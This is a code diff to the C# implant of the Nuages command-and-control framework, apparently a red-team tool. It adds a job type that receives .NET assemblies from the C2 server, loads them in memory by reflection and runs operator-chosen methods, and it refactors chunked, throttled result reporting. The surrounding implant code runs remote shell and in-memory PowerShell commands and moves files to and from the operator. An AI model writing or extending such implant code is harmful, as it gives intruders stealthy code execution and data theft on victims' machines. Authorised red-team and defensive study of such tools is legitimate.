@@ -7,6 +7,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Text;
 using System.Collections.ObjectModel;
+using System.Reflection;
 
 namespace NuagesSharpImplant
 {
@@ -227,6 +228,7 @@ namespace NuagesSharpImplant
         private string connectionString;
         private NuagesC2Connector connector;
         private Dictionary<string, string> options;
+        private Dictionary<string, Assembly> assemblies;
         String[] supportedPayloads;
         JArray jobs;
 
@@ -251,6 +253,8 @@ namespace NuagesSharpImplant
             this.config = config;
 
             this.connector = connector;
+
+            this.assemblies = new Dictionary<string, Assembly>();
 
             try
             {
@@ -285,7 +289,7 @@ namespace NuagesSharpImplant
 
             this.connectionString = connector.getConnectionString();
 
-            this.supportedPayloads = new string[7];
+            this.supportedPayloads = new string[8];
 
             this.supportedPayloads[0] = "command";
 
@@ -300,6 +304,8 @@ namespace NuagesSharpImplant
             this.supportedPayloads[5] = "cd";
 
             this.supportedPayloads[6] = "posh_in_mem";
+
+            this.supportedPayloads[7] = "reflected_assembly";
 
             this.handler = connector.getHandler();
 
@@ -383,18 +389,7 @@ namespace NuagesSharpImplant
                     pProcess.WaitForExit();
                     bool hasError = (pProcess.ExitCode != 0);
                     string result = strOutput + strError;
-                    int n = 0;
-                    int maxrequestsize = 5000;
-                    try
-                    {
-                        maxrequestsize = Int32.Parse(this.config["maxrequestsize"]);
-                    }
-                    catch { }
-                    for (n = 0; (n + 1) * maxrequestsize < result.Length; n++)
-                    {
-                        this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, maxrequestsize), moreData: true, error: hasError, n: n);
-                    }
-                    this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: hasError, n: n);
+                    SubmitJobResult(jobId, result, hasError);
                 }
                 else if (jobType == "cd")
                 {
@@ -411,7 +406,7 @@ namespace NuagesSharpImplant
 
                     string newDir = Directory.GetCurrentDirectory();
 
-                    this.connector.SubmitJobResult(jobId: jobId, result: newDir, moreData: false, error: false);
+                    SubmitJobResult(jobId, newDir, false);
                 }
                 else if (jobType == "configure")
                 {
@@ -420,11 +415,11 @@ namespace NuagesSharpImplant
                     {
                         this.config[x.Key] = x.Value.ToString();
                     }
-                    SubmitJobResult(jobId: jobId, result: Newtonsoft.Json.JsonConvert.SerializeObject(this.config), moreData: false, error: false);
+                    SubmitJobResult(jobId, Newtonsoft.Json.JsonConvert.SerializeObject(this.config), false);
                 }
                 else if (jobType == "exit")
                 {
-                    SubmitJobResult(jobId: jobId, result: "Bye bye!", moreData: false, error: false);
+                    SubmitJobResult(jobId, "Bye Bye!", false);
                     System.Environment.Exit(0);
                 }
                 else if (jobType == "download")
@@ -445,7 +440,7 @@ namespace NuagesSharpImplant
                         this.connector.Pipe2Stream(pipe_id, length, fs);
                         result = fs.Name;
                     }
-                    SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
+                    SubmitJobResult(jobId, result, false);
                 }
                 else if (jobType == "upload")
                 {
@@ -459,13 +454,14 @@ namespace NuagesSharpImplant
                     string file = job.SelectToken("payload.options.file").ToString();
                     string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
                     string result = "";
-                    using (FileStream fs = new FileStream(file, System.IO.FileMode.Open))
+                    using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
                         this.connector.Stream2Pipe(pipe_id, fs);
                         result = fs.Name;
                     }
-                    SubmitJobResult(jobId: jobId, moreData: false, result: result, error: false);
-                }else if(jobType == "posh_in_mem")
+                    SubmitJobResult(jobId, result, false);
+                }
+                else if(jobType == "posh_in_mem")
                 {
                     string command = job.SelectToken("payload.options.command").ToString();
                     string path = ".";
@@ -496,18 +492,44 @@ namespace NuagesSharpImplant
                     }
                     script += "\r\n" + command;
                     string result = this.posh(script);
-                    int maxrequestsize = 5000;
-                    try
-                    {
-                        maxrequestsize = Int32.Parse(this.config["maxrequestsize"]);
+                    SubmitJobResult(jobId, result, false);
+                }
+
+                else if (jobType == "reflected_assembly")
+                {
+                    string arguments = job.SelectToken("payload.options.arguments").ToString();
+                    string method = job.SelectToken("payload.options.method").ToString();
+                    string clas = job.SelectToken("payload.options.class").ToString();
+                    string pipe_id = job.SelectToken("payload.options.pipe_id").ToString();
+                    int length = job.SelectToken("payload.options.length").ToObject<int>();
+                    string file_id = job.SelectToken("payload.options.file_id").ToString();
+                    Assembly assembly;
+                    string[] strarr = arguments.Split(',');
+                    string result = "";
+                    Type[] typearr = new Type[strarr.Length];
+                    Object[] argarr = new Object[strarr.Length];
+                    for (int i = 0; i < strarr.Length; i++) {
+                        if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
+                        {
+                            argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
+                        }
+                        else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
+                        {
+                            argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
+                        }
+                        else {
+                            argarr[i] = strarr[i];
+                        }
+                            typearr[i] = argarr[i].GetType();
                     }
-                    catch { }
-                    int n;
-                    for (n = 0; (n + 1) * maxrequestsize < result.Length; n++)
-                    {
-                        this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, maxrequestsize), moreData: true, error: false, n: n);
+                    if (this.assemblies.ContainsKey(file_id)) {
+                        assembly = this.assemblies[file_id];
+                    } else {
+                        byte[] buffer = this.connector.PipeRead(pipe_id, length);
+                        assembly = Assembly.Load(buffer);
                     }
-                    this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * maxrequestsize, result.Length - (n * maxrequestsize)), moreData: false, error: false, n: n);
+                    result = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr).ToString();
+                    SubmitJobResult(jobId, result, false);
                 }
                 else
                 {
@@ -517,14 +539,22 @@ namespace NuagesSharpImplant
             catch (Exception e)
             {
                 Console.WriteLine(e);
-                SubmitJobResult(jobId: jobId, result: e.Message, moreData: false, error: true);
+                SubmitJobResult(jobId: jobId, result: e.Message, error: true);
             }
 
         }
 
-        private void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
+        private void SubmitJobResult(string jobId, string result = "", bool error = false)
         {
-            this.connector.SubmitJobResult(jobId: jobId, result: result, moreData: moreData, error: error, n: n, data: data);
+            int n;
+            int buffersize = Convert.ToInt32(this.config["buffersize"]);
+            int refreshrate = Convert.ToInt32(this.config["refreshrate"]);
+            for (n = 0; (n + 1) * buffersize < result.Length; n++)
+            {
+                this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, buffersize), moreData: true, error: error, n: n);
+                System.Threading.Thread.Sleep(refreshrate);
+            }
+            this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, result.Length - (n * buffersize)), moreData: false, error: error, n: n);
         }
 
         public void Start()
